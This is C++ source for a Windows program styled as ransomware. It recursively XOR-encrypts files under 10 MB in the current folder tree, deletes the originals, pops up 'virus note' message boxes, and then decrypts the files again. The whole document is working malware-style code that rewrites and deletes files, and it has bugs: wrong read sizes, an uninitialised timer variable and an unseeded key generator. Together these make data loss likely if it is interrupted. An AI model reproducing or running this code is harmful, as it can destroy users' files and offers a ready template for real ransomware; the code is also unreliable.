#include<iostream>
#include<cstring>
#include<time.h>
#include<windows.h>
#include<fstream>
//info:I do not want to obfuscate code, because this is very exotic "ransomware"
using namespace std;
void xor_file(string from,string key,string to,bool delete_original=false)
{
	int g;
	string newFilePath=to;
	string passwd=key;
	string filePath=from;
	char* buffer=new char[passwd.length()];
	for(int i=0; i<passwd.length(); i++)
		buffer[i]='\0';
	ifstream infile(filePath,ios::in|ios::binary);
	ofstream outfile(newFilePath,ios::out|ios::binary);
	if(!infile.is_open())
	{
		cout<<"\""<<from<<"\"";
		cout<<" does not exist"<<endl;
		return;
	}
	while(!infile.eof())
	{
		g=infile.read(buffer,sizeof(buffer)).gcount();
		for(int i=0; i<passwd.length(); i++)
			buffer[i]=buffer[i]^passwd[i];
		outfile.write(buffer,g);
	}
	infile.close();
	outfile.close();
	if(delete_original)
		DeleteFile(from.c_str());
}
void xor_dir(string dir,string key)
{
	string full_name,trunc_name;
	HANDLE hFind;
	WIN32_FIND_DATA findData;
	char dirNew[256];
	strcpy(dirNew, dir.c_str());
	strcat(dirNew, "\\*.*");
	hFind=FindFirstFile(dirNew, &findData);
	do
	{
		if((findData.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)!=0&&strcmp(findData.cFileName,".")!=0&&strcmp(findData.cFileName,"..")!=0)
		{
			strcpy(dirNew, dir.c_str());
			strcat(dirNew, "\\");
			strcat(dirNew, findData.cFileName);
			xor_dir(dirNew,key);
		}
		else if(strcmp(findData.cFileName,".")!=0&&strcmp(findData.cFileName,"..")!=0&&strcmp(findData.cFileName,".enc_info")!=0)
		{
			if(findData.nFileSizeLow>10485760)
				continue;
			full_name=(dir+"\\"+findData.cFileName);
			if(full_name.length()>12)
			{
				trunc_name=full_name.substr(full_name.length()-12);
				if(trunc_name==".xor_encrypt")
					xor_file(full_name,key,full_name.substr(0,full_name.length()-12),true);
				else
					xor_file(full_name,key,full_name+".xor_encrypt",true);
			}
			else
				xor_file(full_name,key,full_name+".xor_encrypt",true);
		}
	}
	while(FindNextFile(hFind,&findData));
	FindClose(hFind);
}
typedef struct enc_info
{
	string dir;
	string key;
} enc_info;
bool done=false;
void* thread_xor_dir(void* p)
{
	enc_info ei=*(enc_info*)p;
	xor_dir(ei.dir,ei.key);
	done=true;
	return nullptr;
}
int main()
{
	int t=time(0),now;
	string key;
	for(int i=1;i<=1024;i++)
		key+=char((rand()%2)?(rand()%26+'A'):(rand()%26+'a'));	
	enc_info enc={".",key};
	pthread_create(0,0,thread_xor_dir,&enc);
	HWND hwnd=GetDesktopWindow();
	while(1)
	{
		if(now-t>60)
			goto time_up;
		if(done)
			goto files_enc;
		now=time(0);
		Sleep(1000);
	}
time_up:
	MessageBox(hwnd,"Your files in this folder have been encrypted by ransomware for a minute!","virus note",MB_OK|MB_ICONINFORMATION);
	MessageBox(hwnd,"To not lose data,wait for it do be done.","virus note",MB_OK|MB_ICONINFORMATION);
	while(!done);
	MessageBox(hwnd,"Done.","virus note",MB_OK|MB_ICONINFORMATION);
	goto next;
files_enc:
	MessageBox(hwnd,"All your files in this folder have been encrypted by ransomware!","virus note",MB_OK|MB_ICONINFORMATION);
next:
	MessageBox(hwnd,"Actually...This will not ask you for any money.Just wait and the files will be decrypted.","virus note",MB_OK|MB_ICONINFORMATION);
	done=false;
	pthread_create(0,0,thread_xor_dir,&enc);
	while(!done);
	MessageBox(hwnd,"Everything is recovered.","virus note",MB_OK|MB_ICONINFORMATION);
	MessageBox(hwnd,"Bye~","virus note",MB_OK|MB_ICONINFORMATION);
	return 0;
}
